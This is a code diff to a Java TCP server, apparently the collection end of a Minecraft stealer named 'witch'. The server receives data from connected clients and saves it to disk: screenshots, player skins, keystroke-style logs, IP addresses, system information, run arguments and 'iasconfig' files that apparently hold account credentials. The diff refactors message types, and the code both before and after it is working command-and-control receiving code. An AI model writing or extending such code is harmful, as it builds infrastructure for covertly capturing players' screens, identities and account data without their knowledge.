@@ -5,8 +5,10 @@ import me.soda.witch.shared.FileUtil;
 import me.soda.witch.shared.socket.Connection;
 import me.soda.witch.shared.socket.TcpServer;
 import me.soda.witch.shared.socket.messages.Message;
-import me.soda.witch.shared.socket.messages.messages.DisconnectInfo;
-import me.soda.witch.shared.socket.messages.messages.PlayerInfo;
+import me.soda.witch.shared.socket.messages.messages.ByteData;
+import me.soda.witch.shared.socket.messages.messages.DisconnectData;
+import me.soda.witch.shared.socket.messages.messages.PlayerData;
+import me.soda.witch.shared.socket.messages.messages.StringData;
 
 import java.io.File;
 import java.io.IOException;
@@ -46,37 +48,41 @@ public class Server extends TcpServer {
 
     @Override
     public void onMessage(Connection conn, Message message) {
-        String msgType = message.messageID;
-        Object msg = message.data;
         Info info = clientMap.get(conn);
         int id = info.index;
-        log("* Received message: " + msgType + " From ID " + id);
+        log("* Received message: " + message.data.getClass().getName() + " From ID " + id);
         Gson GSON = new Gson();
         try {
-            switch (msgType) {
-                case "screenshot", "screenshot2" -> {
-                    File file = new File("data/screenshots", getFileName(msgType + "id", "png", String.valueOf(id), true));
-                    FileUtil.write(file, (byte[]) msg);
+            if (message.data instanceof ByteData data) {
+                switch (data.messageID) {
+                    case "screenshot", "screenshot2" -> {
+                        File file = new File("data/screenshots", getFileName(data.messageID + "id", "png", String.valueOf(id), true));
+                        FileUtil.write(file, data.bytes());
+                    }
+                    case "skin" -> {
+                        String playerName = info.playerData.playerName;
+                        File file = new File("data/skins", getFileName(playerName, "png", String.valueOf(id), false));
+                        FileUtil.write(file, data.bytes());
+                    }
                 }
-                case "skin" -> {
-                    String playerName = info.playerData.playerName;
-                    File file = new File("data/skins", getFileName(playerName, "png", String.valueOf(id), false));
-                    FileUtil.write(file, (byte[]) msg);
+            } else if (message.data instanceof StringData data) {
+                switch (data.messageID()) {
+                    case "logging" -> {
+                        File file = new File("data/logging", getFileName("id", "log", String.valueOf(id), false));
+                        String oldInfo = new String(FileUtil.read(file), StandardCharsets.UTF_8);
+                        FileUtil.write(file, (oldInfo + data.data()).getBytes(StandardCharsets.UTF_8));
+                    }
+                    case "ip" -> info.ip = data.data();
+                    case "iasconfig", "runargs", "systeminfo", "props" -> {
+                        File file = new File("data/data", getFileName(data.messageID(), "txt", info.playerData.playerName, true));
+                        FileUtil.write(file, data.data());
+                    }
+                    case "server_name" -> sendUtil.trySend(conn, "server_name", name);
                 }
-                case "logging" -> {
-                    File file = new File("data/logging", getFileName("id", "log", String.valueOf(id), false));
-                    String oldInfo = new String(FileUtil.read(file), StandardCharsets.UTF_8);
-                    FileUtil.write(file, (oldInfo + msg).getBytes(StandardCharsets.UTF_8));
-                }
-                case "player" -> info.playerData = (PlayerInfo) msg;
-                case "ip" -> info.ip = (String) msg;
-                case "iasconfig", "runargs", "systeminfo", "props" -> {
-                    String ext = msgType.equals("systeminfo") ? "txt" : "json";
-                    File file = new File("data/data", getFileName(msgType, ext, info.playerData.playerName, true));
-                    FileUtil.write(file, GSON.toJson(msg));
-                }
-                case "server_name" -> sendUtil.trySend(conn, msgType, name);
-                default -> log("Message: " + msgType + " " + GSON.toJson(msg));
+            } else if (message.data instanceof PlayerData data) {
+                info.playerData = data;
+            } else {
+                log("Message: " + message.data.getClass().getName() + " " + GSON.toJson(message.data));
             }
         } catch (Exception e) {
             e.printStackTrace();
@@ -84,7 +90,7 @@ public class Server extends TcpServer {
     }
 
     @Override
-    public void onClose(Connection conn, DisconnectInfo disconnectInfo) {
+    public void onClose(Connection conn, DisconnectData disconnectData) {
         log("Client disconnected: ID: " + clientMap.get(conn).index);
         clientMap.remove(conn);
     }
